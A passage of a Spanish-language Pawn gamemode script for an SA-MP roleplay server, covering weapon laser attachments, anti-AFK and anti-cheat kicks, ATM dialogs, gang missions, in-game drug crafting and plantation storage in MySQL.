	    SaveFacc(faccionid);
	}
	return 1;
}

stock IsPlayerInWater(playerid) //Si está en el agua
{
	new anim = GetPlayerAnimationIndex(playerid);
 	if (((anim >=  1538) && (anim <= 1542)) || (anim == 1544) || (anim == 1250) || (anim == 1062)) return 1;
  	return 0;
}

stock IsPlayerAiming(playerid) //Si está apuntando
{
	new anim = GetPlayerAnimationIndex(playerid);
	if (((anim >= 1160) && (anim <= 1163)) || (anim == 1167) || (anim == 1365) || (anim == 1643) || (anim == 1453) || (anim == 220)) return 1;
 	return 0;
}

stock PonerLaser(playerid) //Lasers en armas
{
    RemovePlayerAttachedObject(playerid, 0);
	if ((IsPlayerInAnyVehicle(playerid)) || (IsPlayerInWater(playerid))) return 1;
	switch (PlayerInfo[playerid][pManoDer])
	{
		case 20:
    	{
			if (IsPlayerAiming(playerid))
	    	{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
 				{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SP standing aiming
     				0.108249, 0.030232, 0.118051, 1.468254, 350.512573, 364.284240);
      			}
			  	else
			   	{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SP crouched aiming
      				0.108249, 0.030232, 0.118051, 1.468254, 349.862579, 364.784240);
          		}
            }
			else
		 	{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
	   			{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SP standing not aiming
      				0.078248, 0.027239, 0.113051, -11.131746, 350.602722, 362.384216);
          		}
				else
			   	{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SP crouched not aiming
 					0.078248, 0.027239, 0.113051, -11.131746, 350.602722, 362.384216);
                }
			}
	  	}
		case 24:
	 	{
			if (IsPlayerAiming(playerid))
			{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
	    		{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SPAS standing aiming
      				0.588246, -0.022766, 0.138052, -11.531745, 347.712585, 352.784271);
          		}
			  	else
			   	{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SPAS crouched aiming
      				0.588246, -0.022766, 0.138052, 1.468254, 350.712585, 352.784271);
          		}
   			}
		   	else
		    {
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
		 		{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SPAS standing not aiming
     				0.563249, -0.01976, 0.134051, -11.131746, 351.602722, 351.384216);
         		}
		 		else
			  	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // SPAS crouched not aiming
					0.563249, -0.01976, 0.134051, -11.131746, 351.602722, 351.384216);
                }
			}
		}
		case 27:
	 	{
			if (IsPlayerAiming(playerid))
		 	{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
		  		{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // AK standing aiming
     				0.628249, -0.027766, 0.078052, -6.621746, 352.552642, 355.084289);
         		}
			 	else
			  	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // AK crouched aiming
     				0.628249, -0.027766, 0.078052, -1.621746, 356.202667, 355.084289);
         		}
           	}
		   	else
	    	{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
			 	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // AK standing not aiming
     				0.663249, -0.02976, 0.080051, -11.131746, 358.302734, 353.384216);
         		}
			 	else
			  	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // AK crouched not aiming
     				0.663249, -0.02976, 0.080051, -11.131746, 358.302734, 353.384216);
                }
			}
		}
		case 28:
	 	{
			if (IsPlayerAiming(playerid))
	  		{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
		   		{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // M4 standing aiming
      				0.528249, -0.020266, 0.068052, -6.621746, 352.552642, 355.084289);
  				}
			  	else
			   	{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // M4 crouched aiming
      				0.528249, -0.020266, 0.068052, -1.621746, 356.202667, 355.084289);
       			}
          	}
	  		else
		   	{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
		 		{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // M4 standing not aiming
     				0.503249, -0.02376, 0.065051, -11.131746, 357.302734, 354.484222);
         		}
		 		else
			  	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // M4 crouched not aiming
     				0.503249, -0.02376, 0.065051, -11.131746, 357.302734, 354.484222);
                }
			}
		}
		/*case 31:
	 	{
			if (IsPlayerAiming(playerid))
	 		{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
				{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // Sniper standing aiming
					0.528249, -0.020266, 0.068052, -6.621746, 352.552642, 355.084289);
				}
				else
			 	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // Sniper crouched aiming
					0.528249, -0.020266, 0.068052, -1.621746, 356.202667, 355.084289);
				}
			}
			else
		 	{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
			 	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // Sniper standing not aiming
					0.658248, -0.03276, 0.133051, -11.631746, 355.302673, 353.584259);
				}
				else
			 	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // Sniper crouched not aiming
					0.658248, -0.03276, 0.133051, -11.631746, 355.302673, 353.584259);
				}
			}
		}*/
		case 26:
	 	{
			if (IsPlayerAiming(playerid))
	  		{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
	    		{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // MP5 standing aiming
					0.298249, -0.02776, 0.158052, -11.631746, 359.302673, 357.584259);
  				}
			  	else
			   	{
 					SetPlayerAttachedObject(playerid, 0, 18643, 6, // MP5 crouched aiming
      				0.298249, -0.02776, 0.158052, 8.368253, 358.302673, 352.584259);
          		}
            }
			else
			{
				if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK)
		 		{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // MP5 standing not aiming
     				0.293249, -0.027759, 0.195051, -12.131746, 354.302734, 352.484222);
         		}
		 		else
			  	{
					SetPlayerAttachedObject(playerid, 0, 18643, 6, // MP5 crouched not aiming
     				0.293249, -0.027759, 0.195051, -12.131746, 354.302734, 352.484222);
                }
			}
		}
	}
	return 1;
}

forward LoginKick(playerid);
public LoginKick(playerid)
{
	if(JugadorLogueado[playerid] == 0)
	{
		SendClientMessage(playerid, Rojo, "* Has sido kickeado por tardar demasiado en loguear.");
		KickL(playerid);
	}
	return 1;
}

//-----ANTICHEAT-----//
forward SobeitCheck(playerid);
public SobeitCheck(playerid)
{
	new Float:x, Float:y, Float:z;
    GetPlayerCameraFrontVector(playerid, x, y, z);
    #pragma unused x
    #pragma unused y
    if(z < -0.68)
	{
        new string[128];
        format(string, sizeof(string), "[ANTICHEAT]: EL JUGADOR '%s' SE HA CONECTADO CON SOBEIT Y HA SIDO KICKEADO.", GetPlayerNameRP(playerid));
        SendAdminMessage(Aguamarina, string);
        printf(string);
        SendClientMessage(playerid, Rojo, "* Has sido kickeado porque se ha detectado que usas Cleos o Sobeit.");
        KickL(playerid);
    }
    return 1;
}

forward KickAFK(playerid);
public KickAFK(playerid)
{
	if(EstaAFK[playerid] == 2)
	{
	    new string[128];
	    format(string, sizeof(string), "* %s ha sido expulsado automáticamente por estar AFK.", GetPlayerNameRP(playerid));
	    ProxDetector(25.0, playerid, string, Chat1,Chat2,Chat3,Chat4,Chat5);
	    KickL(playerid);
	}
	return 1;
}

forward AntiAFK(playerid);
public AntiAFK(playerid)
{
	if(PrimerSpawn[playerid] == 0 || JugadorLogueado[playerid] == 0 || !IsPlayerConnected(playerid)){return 1;}
	GetPlayerPos(playerid, AntiAFKPos[playerid][0], AntiAFKPos[playerid][1], AntiAFKPos[playerid][2]);
	if((AntiAFKPos[playerid][0] == AntiAFKPos[playerid][3] && AntiAFKPos[playerid][1] == AntiAFKPos[playerid][4] && AntiAFKPos[playerid][2] == AntiAFKPos[playerid][5]))
    {
		if(EstaAFK[playerid] == 0)
		{
		    EstaAFK[playerid] = 1;
		}
		else
		{
		    ShowPlayerDialog(playerid, 30, DIALOG_STYLE_MSGBOX, "¿Estás AFK?", "Se ha detectado que estás AFK.\nSerás kickeado en 20 segundos si no pulsas el boton.", "No", "");
		    SetTimerEx("KickAFK", 20000, false, "i", playerid);
		    EstaAFK[playerid] = 2;
		}
    }
    else
    {
        AntiAFKPos[playerid][3] = AntiAFKPos[playerid][0];
		AntiAFKPos[playerid][4] = AntiAFKPos[playerid][1];
		AntiAFKPos[playerid][5] = AntiAFKPos[playerid][2];
		EstaAFK[playerid] = 0;
		return 1;
    }
	return 1;
}

stock GivePlayerMoneyAC(playerid, money)
{
    DineroAC[playerid] += money;
	GivePlayerMoney(playerid, money);
}

stock ResetPlayerMoneyAC(playerid)
{
    DineroAC[playerid] = 0;
	ResetPlayerMoney(playerid);
}
//-----FIN ANTICHEAT-----//

forward TimerEntrenar(playerid, entrenamiento);
public TimerEntrenar(playerid, entrenamiento)
{
	if(entrenamiento == 1) //PressBanca
	{
	    if(HaciendoPressBanca[playerid] == 1)
	    {
			new string[128];
			if(RepeticionesPressBanca[playerid]/20 <= 30)
			{
				format(string, sizeof(string), "Has hecho %d repeticiones en press banca.", RepeticionesPressBanca[playerid]/20);
			}
			else{format(string, sizeof(string), "Has hecho 30 repeticiones en press banca."); RepeticionesPressBanca[playerid] = 600;}
			SendClientMessage(playerid, Verde, string);
			TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid, "benchpress", "gym_bp_getoff", 1, 0, 0, 0, 0, 0, 1);
			PressBancaBarraObjeto[0] = CreateObject(2913, barbell_pos[ 0 ][ 0 ], barbell_pos[ 0 ][ 1 ], barbell_pos[ 0 ][ 2 ], barbell_pos[ 0 ][ 3 ], barbell_pos[ 0 ][ 4 ], barbell_pos[ 0 ][ 5 ] );
			PressBancaBarraObjeto[1] = CreateObject(2913, barbell_pos[ 1 ][ 0 ], barbell_pos[ 1 ][ 1 ], barbell_pos[ 1 ][ 2 ], barbell_pos[ 1 ][ 3 ], barbell_pos[ 1 ][ 4 ], barbell_pos[ 1 ][ 5 ] );
			PressBancaBarraObjeto[2] = CreateObject(2913, barbell_pos[ 2 ][ 0 ], barbell_pos[ 2 ][ 1 ], barbell_pos[ 2 ][ 2 ], barbell_pos[ 2 ][ 3 ], barbell_pos[ 2 ][ 4 ], barbell_pos[ 2 ][ 5 ] );
			RemovePlayerAttachedObject(playerid, 5);
			new fuerza = RepeticionesPressBanca[playerid]/20/2 + random(6);
			format(string, sizeof(string), "Tu fuerza ha aumentado en %.2f", float(fuerza)/100);
			SendClientMessage(playerid, Verde, string);
			PlayerInfo[playerid][pFuerza] += fuerza;
			RepeticionesPressBanca[playerid] = 0;
			HaciendoPressBanca[playerid] = 0;
			PlayerInfo[playerid][pCansancioEntrenar] += 180;
			return 1;
		}
	}
	return 1;
}

stock MostrarATM(playerid, parte)
{
	new string[128], dialog[250];
	if(parte == 1) //Menú principal
	{
	    format(string, sizeof(string), "\nRetirar dinero");
		strcat(dialog, string);
		format(string, sizeof(string), "\nIngresar dinero");
		strcat(dialog, string);
		format(string, sizeof(string), "\nTransferir dinero");
		strcat(dialog, string);
		format(string, sizeof(string), "\nBalance");
		strcat(dialog, string);
		ShowPlayerDialog(playerid, 24, DIALOG_STYLE_LIST, "Cajero automático", dialog, "Seleccionar", "Salir");
	}
	if(parte == 2) //Retirar dinero
	{
	    format(string, sizeof(string), "Cantidad de dinero en cuenta bancaria: %d$", PlayerInfo[playerid][pDineroBanco]);
	    strcat(dialog, string);
	    format(string, sizeof(string), "\nEscribe la cantidad que deseas retirar.", PlayerInfo[playerid][pDineroBanco]);
	    strcat(dialog, string);
		ShowPlayerDialog(playerid, 25, DIALOG_STYLE_INPUT, "Cajero automático", dialog, "Aceptar", "Salir");
	}
	if(parte == 3) //Ingresar dinero
	{
	    format(string, sizeof(string), "Cantidad de dinero en cuenta bancaria: %d$", PlayerInfo[playerid][pDineroBanco]);
	    strcat(dialog, string);
	    format(string, sizeof(string), "\nEscribe la cantidad que deseas ingresar.", PlayerInfo[playerid][pDineroBanco]);
	    strcat(dialog, string);
		ShowPlayerDialog(playerid, 26, DIALOG_STYLE_INPUT, "Cajero automático", dialog, "Aceptar", "Salir");
	}
	if(parte == 4) //Transferir dinero (ID)
	{
		ShowPlayerDialog(playerid, 27, DIALOG_STYLE_INPUT, "Cajero automático", "Escribe el número de la cuenta bancaria (ID).", "Aceptar", "Salir");
	}
	if(parte == 5) //Transferir dinero (Cantidad)
	{
	    format(string, sizeof(string), "Cantidad de dinero en cuenta bancaria: %d$", PlayerInfo[playerid][pDineroBanco]);
	    strcat(dialog, string);
	    format(string, sizeof(string), "\nEscribe la cantidad que deseas transferir.", PlayerInfo[playerid][pDineroBanco]);
	    strcat(dialog, string);
		ShowPlayerDialog(playerid, 28, DIALOG_STYLE_INPUT, "Cajero automático", dialog, "Aceptar", "Salir");
	}
	if(parte == 6) //Balance
	{
	    format(string, sizeof(string), "Cantidad de dinero en cuenta bancaria: %d$", PlayerInfo[playerid][pDineroBanco]);
		ShowPlayerDialog(playerid, 29, DIALOG_STYLE_MSGBOX, "Cajero automático", string, "Aceptar", "Salir");
	}
	return 1;
}

forward PintarGraffiti(playerid);
public PintarGraffiti(playerid)
{
	if(MuroAPintar[playerid] != NOEXISTE)
	{
		new pintarid = MuroAPintar[playerid];
		MuroAPintar[playerid] = NOEXISTE;

		if(IsValidObject(LugaresPintar[pintarid][Texto])) DestroyObject(LugaresPintar[pintarid][Texto]);

		new nombrefacc[64], color[15], string[128];

		LugaresPintar[pintarid][Texto] = CreateObject(19482, LugaresPintar[pintarid][GraffitiX], LugaresPintar[pintarid][GraffitiY], LugaresPintar[pintarid][GraffitiZ], 180.0, 180.0, LugaresPintar[pintarid][GraffitiRotZ]);

	    format(nombrefacc, sizeof(nombrefacc), "%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fNombre]);
	    format(color, sizeof(color), "0xFF%s", FaccInfo[PlayerInfo[playerid][pFaccion]][fColor]);
		SetObjectMaterialText(LugaresPintar[pintarid][Texto], nombrefacc, 0, OBJECT_MATERIAL_SIZE_256x128, "Kristen ITC", 28, 0, HexToInt(color), 0x00000000, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);

	    TogglePlayerControllable(playerid, 1);
	    
	    format(string, sizeof(string), "* %s ha pintado un graffiti en el muro.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	    
	    new puntos = 1+random(4);
	    FaccInfo[PlayerInfo[playerid][pFaccion]][fPuntosExpansion] += puntos;
	    format(string, sizeof(string), "Tu facción gana %d puntos de expansión por esta acción.", puntos);
	    SendClientMessage(playerid, Amarillo, string);
    }
    return 1;
}

forward DarMisionPandilla(playerid, tipo);
public DarMisionPandilla(playerid, tipo)
{
	if(tipo == 1) //Mision de conseguir droga
	{
	    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Oye tío, necesito que hagas algo por mí.");
	    SendClientMessage(playerid, Naranja, "* Escribe '/Aceptar Mision' para hacer el recado.");
	    MisionEncargada[playerid] = 1;
	}
	if(tipo == 2) //Mision de conseguir arma
	{
	    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Hazme un favor, necesito que te lleves lo antes posible una cosa.");
	    SendClientMessage(playerid, Naranja, "* Escribe '/Aceptar Mision' para hacer el recado.");
	    MisionEncargada[playerid] = 2;
	}
	if(tipo == 3) //Mision de pintar
	{
	    SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Eh, es hora de marcar un poco el territorio, ¿te apuntas?");
	    SendClientMessage(playerid, Naranja, "* Escribe '/Aceptar Mision' para hacer el recado.");
	    MisionEncargada[playerid] = 3;
	}
	return 1;
}

stock GetPlayerCajaArmamento(playerid, mano)
{
    if(mano == 1) //Mano derecha
	{
		switch(PlayerInfo[playerid][pManoDer])
		{
		    case 102: return 8; //Katana
		    case 103: return 19; //M1911
		    case 104: return 39; //Cargador M1911
		    case 105: return 47; //Balas .45 ACP
		    case 106: return 21; //D. Eagle
		    case 107: return 40; //Cargador D. Eagle
		    case 108: return 48; //Balas .50 AE
		    case 109: return 29; //Tec-9
		    case 110: return 43; //Cargador Tec-9
		    case 111: return 25; //UZI
		    case 112: return 41; //Cargador UZI
		    case 113: return 26; //MP5
		    case 114: return 42; //Cargador MP5
		    case 115: return 49; //Balas SMG
		    case 116: return 22; //Escopeta
		    case 117: return 23; //Escopeta recortada
		    case 118: return 50; //Cartuchos 12GA
		    case 119: return 27; //Ak-47
		    case 120: return 44; //Cargador Ak-47
		    case 121: return 51; //Balas Ak-47
		    case 122: return 30; //Rifle
		    case 123: return 46; //Cargador rifle
		    case 124: return 53; //Balas rifle
		}
	}
	if(mano == 2) //Mano izquierda
	{
		switch(PlayerInfo[playerid][pManoIzq])
		{
		    case 102: return 8; //Katana
		    case 103: return 19; //M1911
		    case 104: return 39; //Cargador M1911
		    case 105: return 47; //Balas .45 ACP
		    case 106: return 21; //D. Eagle
		    case 107: return 40; //Cargador D. Eagle
		    case 108: return 48; //Balas .50 AE
		    case 109: return 29; //Tec-9
		    case 110: return 43; //Cargador Tec-9
		    case 111: return 25; //UZI
		    case 112: return 41; //Cargador UZI
		    case 113: return 26; //MP5
		    case 114: return 42; //Cargador MP5
		    case 115: return 49; //Balas SMG
		    case 116: return 22; //Escopeta
		    case 117: return 23; //Escopeta recortada
		    case 118: return 50; //Cartuchos 12GA
		    case 119: return 27; //Ak-47
		    case 120: return 44; //Cargador Ak-47
		    case 121: return 51; //Balas Ak-47
		    case 122: return 30; //Rifle
		    case 123: return 46; //Cargador rifle
		    case 124: return 53; //Balas rifle
		}
	}
	return 0;
}

stock SetVehicleMatricula(carid)
{
	if(!GetVehicleModel(carid)) return 1;
	new matricula[24];
	if(carid <= MAX_VEHPUBLICO) //Vehículo scripteado
	{
	    format(matricula, sizeof(matricula), "LS-%d", carid);
		SetVehicleNumberPlate(carid, matricula);
	}
	else if(carid > MAX_VEHPUBLICO) //Vehículo privado
	{
	    format(matricula, sizeof(matricula), "LS-%d", CarInfo[carid][cLlave]);
		SetVehicleNumberPlate(carid, matricula);
	}
	return 1;
}

stock GetPlayerCargadorCalibre(playerid, mano)
{
	if(mano == 1) //Mano derecha
	{
		if(PlayerInfo[playerid][pManoDer] == 39) return 1; //M1911 (.45 ACP)
		if(PlayerInfo[playerid][pManoDer] == 40) return 2; //D.Eagle (.50 AE)
		if(PlayerInfo[playerid][pManoDer] == 41) return 3; //UZI (9mm)
		if(PlayerInfo[playerid][pManoDer] == 42) return 3; //MP5 (9mm)
		if(PlayerInfo[playerid][pManoDer] == 43) return 3; //Tec9 (9mm)
		if(PlayerInfo[playerid][pManoDer] == 44) return 5; //Ak47
		if(PlayerInfo[playerid][pManoDer] == 45) return 6; //M4
		if(PlayerInfo[playerid][pManoDer] == 46) return 7; //Rifle
	}
	if(mano == 2) //Mano izquierda
	{
		if(PlayerInfo[playerid][pManoIzq] == 39) return 1; //M1911 (.45 ACP)
		if(PlayerInfo[playerid][pManoIzq] == 40) return 2; //D.Eagle (.50 AE)
		if(PlayerInfo[playerid][pManoIzq] == 41) return 3; //UZI (9mm)
		if(PlayerInfo[playerid][pManoIzq] == 42) return 3; //MP5 (9mm)
		if(PlayerInfo[playerid][pManoIzq] == 43) return 3; //Tec9 (9mm)
		if(PlayerInfo[playerid][pManoIzq] == 44) return 5; //Ak47
		if(PlayerInfo[playerid][pManoIzq] == 45) return 6; //M4
		if(PlayerInfo[playerid][pManoIzq] == 46) return 7; //Rifle
	}
	return 0;
}

stock GetPlayerMunicionCalibre(playerid, mano)
{
	if(mano == 1) //Mano derecha
	{
		if(PlayerInfo[playerid][pManoDer] == 47) return 1; //M1911 (.45 ACP)
		if(PlayerInfo[playerid][pManoDer] == 48) return 2; //D.Eagle (.50 AE)
		if(PlayerInfo[playerid][pManoDer] == 49) return 3; //UZI MP5 Tec9 (9mm)
		if(PlayerInfo[playerid][pManoDer] == 50) return 4; //Escopetas (12GA)
		if(PlayerInfo[playerid][pManoDer] == 51) return 5; //Ak47
		if(PlayerInfo[playerid][pManoDer] == 52) return 6; //M4
		if(PlayerInfo[playerid][pManoDer] == 53) return 7; //Rifle
	}
	if(mano == 2) //Mano izquierda
	{
		if(PlayerInfo[playerid][pManoIzq] == 47) return 1; //M1911 (.45 ACP)
		if(PlayerInfo[playerid][pManoIzq] == 48) return 2; //D.Eagle (.50 AE)
		if(PlayerInfo[playerid][pManoIzq] == 49) return 3; //UZI MP5 Tec9 (9mm)
		if(PlayerInfo[playerid][pManoIzq] == 50) return 4; //Escopetas (12GA)
		if(PlayerInfo[playerid][pManoIzq] == 51) return 5; //Ak47
		if(PlayerInfo[playerid][pManoIzq] == 52) return 6; //M4
		if(PlayerInfo[playerid][pManoIzq] == 53) return 7; //Rifle
	}
	return 0;
}

stock GetPlayerReloj(playerid)
{
	switch(PlayerInfo[playerid][pManoDer])
	{
	    case 87: return 87;
	    case 88: return 88;
	    case 89: return 89;
	    case 90: return 90;
	    case 91: return 91;
	    case 92: return 92;
	    case 93: return 93;
	    case 94: return 94;
		case 95: return 95;
	    case 96: return 96;
	    case 97: return 97;
	    case 98: return 98;
	    case 99: return 99;
	    case 100: return 100;
	    case 101: return 101;
	}
	switch(PlayerInfo[playerid][pManoIzq])
	{
	    case 87: return 87;
	    case 88: return 88;
	    case 89: return 89;
	    case 90: return 90;
	    case 91: return 91;
	    case 92: return 92;
	    case 93: return 93;
	    case 94: return 94;
		case 95: return 95;
	    case 96: return 96;
	    case 97: return 97;
	    case 98: return 98;
	    case 99: return 99;
	    case 100: return 100;
	    case 101: return 101;
	}
	for(new x = 0; x<8; x++)
	{
	    switch(PlayerInfo[playerid][pBol][x])
		{
		    case 87: return 87;
		    case 88: return 88;
		    case 89: return 89;
		    case 90: return 90;
		    case 91: return 91;
		    case 92: return 92;
		    case 93: return 93;
		    case 94: return 94;
			case 95: return 95;
		    case 96: return 96;
		    case 97: return 97;
		    case 98: return 98;
		    case 99: return 99;
		    case 100: return 100;
		    case 101: return 101;
		}
	}
	return 0;
}

stock IsValidSkin(SkinID) //Skins públicos (no facciones legales ni pandillas)
{
        if((SkinID >= 1) && (SkinID <= 70) || (SkinID >= 75) && (SkinID <= 85)||(SkinID == 268)||(SkinID == 72)||(SkinID == 73)||(SkinID >= 111 && SkinID <= 113)||(SkinID >= 117 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 172)||(SkinID >= 176 && SkinID <= 264)||(SkinID >= 272 && SkinID <= 273)||(SkinID >= 289 && SkinID <= 299||(SkinID >= 87 && SkinID <= 91)||(SkinID >= 93 && SkinID <= 98)||(SkinID >= 100 && SkinID <= 101))) return true;
        else return false;
}

stock GetPlayerFardoDroga(playerid, mano)
{
	if(mano == 1) //Mano derecha
	{
		if(PlayerInfo[playerid][pManoDer] == 75) return 1;
		if(PlayerInfo[playerid][pManoDer] == 76) return 2;
		if(PlayerInfo[playerid][pManoDer] == 77) return 3;
		if(PlayerInfo[playerid][pManoDer] == 78) return 4;
		if(PlayerInfo[playerid][pManoDer] == 79) return 5;
	}
	if(mano == 2) //Mano izquierda
	{
		if(PlayerInfo[playerid][pManoIzq] == 75) return 1;
		if(PlayerInfo[playerid][pManoIzq] == 76) return 2;
		if(PlayerInfo[playerid][pManoIzq] == 77) return 3;
		if(PlayerInfo[playerid][pManoIzq] == 78) return 4;
		if(PlayerInfo[playerid][pManoIzq] == 79) return 5;
	}
	return 0;
}

stock GetPlayerBolsitaDroga(playerid, mano)
{
	if(mano == 1) //Mano derecha
	{
		if(PlayerInfo[playerid][pManoDer] == 80) return 1;
		if(PlayerInfo[playerid][pManoDer] == 81) return 2;
		if(PlayerInfo[playerid][pManoDer] == 82) return 3;
		if(PlayerInfo[playerid][pManoDer] == 83) return 4;
		if(PlayerInfo[playerid][pManoDer] == 84) return 5;
	}
	if(mano == 2) //Mano izquierda
	{
		if(PlayerInfo[playerid][pManoIzq] == 80) return 1;
		if(PlayerInfo[playerid][pManoIzq] == 81) return 2;
		if(PlayerInfo[playerid][pManoIzq] == 82) return 3;
		if(PlayerInfo[playerid][pManoIzq] == 83) return 4;
		if(PlayerInfo[playerid][pManoIzq] == 84) return 5;
	}
	return 0;
}

forward PrepararDroga(playerid, droga);
public PrepararDroga(playerid, droga)
{
    PreparandoDroga[playerid] = 0;
	new string[128];
	if(droga == 1) //Marihuana
	{
	    new gramos = (20 + random(11));
	    if(PlayerInfo[playerid][pManoDer] == 86){PlayerInfo[playerid][pManoDer] = 75; PlayerInfo[playerid][pManoDerCant] = gramos; PonerObjeto(playerid, 1, 75);}
	    else if(PlayerInfo[playerid][pManoIzq] == 86){PlayerInfo[playerid][pManoIzq] = 75; PlayerInfo[playerid][pManoIzqCant] = gramos; PonerObjeto(playerid, 2, 75);}
	    else{SendClientMessage(playerid, Rojo, "* No tienes una planta de marihuana en ninguna mano, así que no has podido preparar marihuana."); return 1;}
		format(string, sizeof(string), "* Has preparado {fce80c}%d gramos de marihuana {FFFFFF}a partir de tu planta.", gramos);
		SendClientMessage(playerid, Blanco, string);
	}
	if(droga == 2) //Crack
	{
	    new gramos;
	    new gramosrand = random(6);
	    if(PlayerInfo[playerid][pManoDer] == 81){PlayerInfo[playerid][pManoDer] = 77; gramos = PlayerInfo[playerid][pManoDerCant] = PlayerInfo[playerid][pManoDerCant]*4 + gramosrand; PonerObjeto(playerid, 1, 78);}
	    else if(PlayerInfo[playerid][pManoIzq] == 81){PlayerInfo[playerid][pManoIzq] = 77; gramos = PlayerInfo[playerid][pManoIzqCant] = PlayerInfo[playerid][pManoIzqCant]*4 + gramosrand; PonerObjeto(playerid, 2, 78);}
	    else{SendClientMessage(playerid, Rojo, "* No tienes una bolsita de cocaína en ninguna mano, así que no has podido preparar crack."); return 1;}
		format(string, sizeof(string), "* Has preparado {fce80c}%d gramos de crack.", gramos);
		SendClientMessage(playerid, Blanco, string);
	}
	return 1;
}

stock GetPlayerPlantacion(playerid)
{
	new planta;
	for(new x=0; x<=CodigoPlantacion; x++)
	{
	    if(PlantaInfo[x][plEstado] > 0)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 2.0, PlantaInfo[x][plX], PlantaInfo[x][plY], PlantaInfo[x][plZ])){planta = x; break;}
	    }
	}
	return planta;
}

stock CrearPlantacion(playerid, Tipo, Float:X, Float:Y, Float:Z, VirtualWorld, Interior)
{
	new planta = CodigoPlantacion;
	if(Tipo == 1) //Marihuana
	{
	    PlantaInfo[planta][plSQLID] = CodigoPlantacion;
		PlantaInfo[planta][plObjeto] = CreateDynamicObject(2195, X, Y, Z - 0.9, 0, 0, 0, VirtualWorld, Interior);
		PlantaInfo[planta][plTipo] = 1;
		PlantaInfo[planta][plEstado] = 1;
		PlantaInfo[planta][plInt] = Interior;
		PlantaInfo[planta][plVW] = VirtualWorld;
		PlantaInfo[planta][plX] = X;
		PlantaInfo[planta][plY] = Y;
		PlantaInfo[planta][plZ] = Z;
		format(PlantaInfo[planta][plPlantador], 36, "%s", GetPlayerNameRP(playerid));
		
		new query[258];
	    format(query, sizeof(query), "INSERT INTO plantaciones (Plantador) VALUES ('%s')", GetPlayerNameRP(playerid));
		mysql_query(1, query);
		SavePlantacion(planta);
		PlantaInfo[planta][plPickup] = CreateDynamic3DTextLabel("",Verde,X,Y,Z,7.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,VirtualWorld,Interior);
		UpdatePlantacionLabel(planta);
	}
	TotalPlantaciones ++;
	CodigoPlantacion ++;
	return 1;
}

stock EliminarPlantacion(planta)
{
    PlantaInfo[planta][plEstado] = 0;
    DestroyDynamic3DTextLabel(PlantaInfo[planta][plPickup]);
    DestroyDynamicObject(PlantaInfo[planta][plObjeto]);
	SavePlantacion(planta);
	return 1;
}

SavePlantacion(idx)
{
	new query[258];
    format(query, sizeof(query), "UPDATE plantaciones SET Tipo=%d,X=%f,Y=%f,Z=%f,Plantador='%s',Estado=%d,Interior=%d,VirtualWorld=%d WHERE SQLID=%d",
	PlantaInfo[idx][plTipo],
	PlantaInfo[idx][plX],
	PlantaInfo[idx][plY],
	PlantaInfo[idx][plZ],
	PlantaInfo[idx][plPlantador],
	PlantaInfo[idx][plEstado],
	PlantaInfo[idx][plInt],
	PlantaInfo[idx][plVW],
	PlantaInfo[idx][plSQLID]);
	mysql_query(1, query);
}

UpdatePlantacionLabel(x) //Actualiza 3DTextLabels plantaciones
{
	new string[250];
	if(PlantaInfo[x][plTipo] <= 1) //Marihuana
	{
		if(PlantaInfo[x][plEstado] <= 100)
		{
			format(string,sizeof(string),"Plantación marihuana\nEstado: %d%%",PlantaInfo[x][plEstado]);
		}
		else if(PlantaInfo[x][plEstado] > 100)
		{
			format(string,sizeof(string),"Plantación marihuana\nEstado: 100%%");
		}
	}
	UpdateDynamic3DTextLabelText(PlantaInfo[x][plPickup],Verde,string);
}

LoadPlantacion()
{
    new Query[180], content[60];
	new ccount;
	new sql[80], row[512];
 	format(sql, sizeof(sql), "SELECT SQLID FROM plantaciones ORDER BY SQLID DESC");
	mysql_query(1, sql);
	mysql_store_result();
	mysql_fetch_row(row);
	ccount = strval(row);

	for(new x=0; x<=ccount; x++)
	{
	    mysql_format(1, Query, sizeof(Query), "SELECT * FROM `plantaciones` WHERE `SQLID` = %d", x);
		mysql_query(1, Query);
